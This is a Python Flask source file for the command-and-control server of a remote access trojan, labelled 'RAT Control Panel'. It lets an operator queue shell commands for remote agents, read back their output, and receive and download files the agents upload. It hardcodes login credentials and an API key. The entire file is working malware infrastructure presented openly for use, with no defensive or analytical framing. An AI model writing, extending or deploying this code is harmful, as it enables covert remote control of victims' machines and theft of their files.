from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for, send_from_directory
import os
import datetime
from functools import wraps
from datetime import timedelta
from markupsafe import escape

app = Flask(__name__)
app.secret_key = "8qv$#NmWuc0b!W6v^a3CZU1RbJ6BGU"
app.permanent_session_lifetime = timedelta(seconds=20)

COMMAND = ""
OUTPUT = ""
API_KEY = "BfgJ4#hx7K&*G2se2jbNEV#m!X024$"
USERNAME = "shadowprotocol"
PASSWORD = "x#RdNWgTh9PQV*w9K5BnW3EgZJKu0z"
UPLOAD_FOLDER = "uploaded_files"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# ---------- HTML Pages ----------
LOGIN_PAGE = '''
<!DOCTYPE html>
<html><body style="font-family:monospace; background:#111; color:#0f0;">
<h2>Login</h2>
<form method="post">
    Username: <input name="username" /><br/>
    Password: <input name="password" type="password" /><br/>
    <input type="submit" value="Login" />
    {% if error %}<p style="color:red;">{{error}}</p>{% endif %}
</form>
</body></html>
'''

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>RAT Control Panel</title>
    <script>
        async function refreshOutput() {
            const res = await fetch('/output', { 
                credentials: 'same-origin',
                headers: { 'X-API-KEY': {{ api_key | tojson }} }
            });
            if (res.ok) {
                const text = await res.text();
                document.getElementById("output").innerText = text;
            } else {
                document.getElementById("output").innerText = "Error fetching output.";
            }
        }
        setInterval(refreshOutput, 2000);
        window.onload = refreshOutput;
    </script>
</head>
<body style="font-family:monospace; background:#111; color:#0f0;">
<h2>Remote Command Execution</h2>
<form method="post">
    <input name="command" style="width:80%;" placeholder="Enter shell command" autofocus />
    <input type="submit" value="Send" />
</form>
<h3>Output:</h3>
<pre id="output">Waiting for response...</pre>
<a href="/files" style="color:#0ff;">View Uploaded Files</a><br/>
<a href="/logout" style="color:#f00;">Logout</a>
</body>
</html>
'''

# ---------- Security ----------
def check_api_key():
    return request.headers.get("X-API-KEY") == API_KEY

def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return wrapper

# ---------- Routes ----------
@app.route("/login", methods=["GET", "POST"])
def login():
    global OUTPUT, COMMAND
    error = None
    if request.method == "POST":
        if request.form.get("username") == USERNAME and request.form.get("password") == PASSWORD:
            session.permanent = True  # Enables session timeout
            session['logged_in'] = True
            OUTPUT = ""
            COMMAND = ""
            return redirect(url_for("index"))
        else:
            error = "Invalid credentials"
    return render_template_string(LOGIN_PAGE, error=error)

@app.route("/logout")
def logout():
    global OUTPUT, COMMAND
    OUTPUT = ""
    COMMAND = ""
    session.pop('logged_in', None)
    return redirect(url_for("login"))

@app.route("/", methods=["GET", "POST"])
@login_required
def index():
    global COMMAND, OUTPUT
    if request.method == "POST":
        COMMAND = request.form["command"]
        OUTPUT = ""
    return render_template_string(HTML_PAGE, output=OUTPUT, api_key=API_KEY)

@app.route("/output", methods=["GET"])
def get_output():
    if not check_api_key():
        return "Unauthorized", 401
    response = app.response_class(OUTPUT, mimetype='text/plain')
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    return response

# ---------- Agent Communication ----------
@app.route("/get_command", methods=["GET"])
def get_command():
    if not check_api_key():
        return "Unauthorized", 401
    return jsonify({"command": COMMAND})

@app.route("/post_output", methods=["POST"])
def post_output():
    if not check_api_key():
        return "Unauthorized", 401
    global OUTPUT
    data = request.json
    OUTPUT = data.get("output", "")
    return "OK"

@app.route("/upload", methods=["POST"])
def upload():
    if not check_api_key():
        return "Unauthorized", 403
    if 'file' not in request.files:
        return "No file part", 400
    file = request.files["file"]
    if file.filename == "":
        return "No filename", 400
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{timestamp}_{file.filename}"
    file.save(os.path.join(UPLOAD_FOLDER, filename))
    return "File uploaded", 200

@app.route("/files")
@login_required
def files():
    files = sorted(os.listdir(UPLOAD_FOLDER), reverse=True)
    links = [f"<li><a href='/download/{f}'>{f}</a></li>" for f in files]
    return f"<h2>Uploaded Files</h2><ul>{''.join(links)}</ul><a href='/'>⬅️ Back</a>"

@app.route("/download/<filename>")
@login_required
def download(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

# ---------- Run ----------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
